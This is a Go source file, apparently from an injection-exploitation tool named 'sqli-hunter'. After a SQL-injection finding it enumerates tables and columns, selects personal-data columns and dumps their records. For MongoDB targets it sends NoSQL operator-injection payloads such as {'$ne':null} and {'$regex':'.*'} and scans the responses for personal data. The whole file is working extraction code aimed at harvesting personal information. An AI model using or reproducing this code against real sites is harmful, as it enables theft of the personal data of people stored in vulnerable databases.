package extractor

import (
	"context"
	"fmt"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

func (e *Extractor) runPIIFromFinding(ctx context.Context, target models.ScanTarget, finding models.Finding) []models.ExtractedData {
	if finding.VulnType == models.NoSQL {
		return e.runPIINoSQL(ctx, target, finding)
	}
	return e.runPIISQL(ctx, target, finding)
}

func (e *Extractor) fireDumpFail(finding models.Finding, reason string) {
	if e.onDumpFail != nil {
		e.onDumpFail(finding, reason)
	}
}

func (e *Extractor) runPIISQL(ctx context.Context, target models.ScanTarget, finding models.Finding) []models.ExtractedData {
	param := finding.Parameter
	vulnType := finding.VulnType
	dbms := normalizeDBMS(finding.DBMS)
	findingURL := finding.URL

	// Phase 1 — tables
	tablesJob := BuildTablesJob(dbms, vulnType)
	tablesRaw := e.execJob(ctx, target, param, tablesJob)
	if tablesRaw == "" {
		e.fireDumpFail(finding, "énumération tables échouée")
		return nil
	}

	userTables := splitTableList(tablesRaw)
	if len(userTables) == 0 {
		// fallback : tenter tables connues
		userTables = []string{"users", "clients", "customers", "adherents", "members"}
	}
	if len(userTables) > maxPIITables {
		userTables = userTables[:maxPIITables]
	}

	var results []models.ExtractedData
	seen := make(map[string]bool)

	for _, table := range userTables {
		if ctx.Err() != nil {
			break
		}

		// Phase 2 — colonnes
		colsJob := BuildColumnsJob(dbms, table, vulnType)
		colsRaw := e.execJob(ctx, target, param, colsJob)
		if colsRaw == "" {
			continue
		}

		piiCols := SelectPIIColumns(splitColumnList(colsRaw))
		if !HasMinimumPIIColumns(piiCols) {
			continue
		}

		// Phase 3 — dump PII
		dumpJob := BuildPIIDumpJob(dbms, table, piiCols, vulnType)
		dumpRaw := e.execJob(ctx, target, param, dumpJob)
		if dumpRaw == "" {
			continue
		}

		records := ParseLabeledPII(dumpRaw, table)
		for _, rec := range records {
			formatted := FormatPIIRecord(rec)
			if seen[formatted] {
				continue
			}
			seen[formatted] = true
			pii := rec.ToModel()

			data := models.ExtractedData{
				FindingURL: findingURL,
				Parameter:  param,
				VulnType:   vulnType,
				DBMS:       dbms,
				DataType:   models.DataPII,
				Value:      formatted,
				Payload:    dumpJob.Payload,
				Method:     dumpJob.Method,
				PII:        &pii,
			}
			results = append(results, data)
			if e.onExtract != nil {
				e.onExtract(data)
			}
		}
	}

	if len(results) == 0 {
		e.fireDumpFail(finding, "aucune donnée PII extraite")
	}
	return results
}

func (e *Extractor) runPIINoSQL(ctx context.Context, target models.ScanTarget, finding models.Finding) []models.ExtractedData {
	param := finding.Parameter
	vulnType := finding.VulnType
	findingURL := finding.URL
	jobs := []ExtractionJob{
		{DataType: models.DataDump, Payload: `{"$regex":".*"}`, Method: "nosql"},
		{DataType: models.DataDump, Payload: `{"$ne":null}`, Method: "nosql"},
		{DataType: models.DataDump, Payload: `{"$gt":""}`, Method: "nosql"},
	}

	var results []models.ExtractedData
	seen := make(map[string]bool)

	for _, job := range jobs {
		if ctx.Err() != nil {
			break
		}
		body := e.execJob(ctx, target, param, job)
		if body == "" {
			continue
		}

		for _, rec := range ScanPIIInText(body) {
			formatted := FormatPIIRecord(rec)
			if seen[formatted] {
				continue
			}
			seen[formatted] = true
			pii := rec.ToModel()

			data := models.ExtractedData{
				FindingURL: findingURL,
				Parameter:  param,
				VulnType:   vulnType,
				DBMS:       "mongodb",
				DataType:   models.DataPII,
				Value:      formatted,
				Payload:    job.Payload,
				Method:     "nosql",
				PII:        &pii,
			}
			results = append(results, data)
			if e.onExtract != nil {
				e.onExtract(data)
			}
		}
	}

	if len(results) == 0 {
		e.fireDumpFail(finding, "aucune donnée PII extraite (nosql)")
	}
	return results
}

func (e *Extractor) execJob(ctx context.Context, target models.ScanTarget, param string, job ExtractionJob) string {
	if e.rateLimit != nil {
		e.rateLimit()
	}
	if e.onProgress != nil {
		e.onProgress(fmt.Sprintf("[extract:pii] %s → %s", job.DataType, truncPayload(job.Payload, 60)))
	}

	resp, err := e.httpClient.Send(ctx, target, param, job.Payload)
	if err != nil {
		return ""
	}

	val, ok := ParseResponse(resp.Body, job.Payload, job.Method, job.DataType)
	if !ok {
		// PII dump peut être dans tilde wrapper
		if job.DataType == models.DataPII {
			if records := ParseLabeledPII(resp.Body, job.Table); len(records) > 0 {
				return records[0].Raw
			}
		}
		return ""
	}
	return val
}
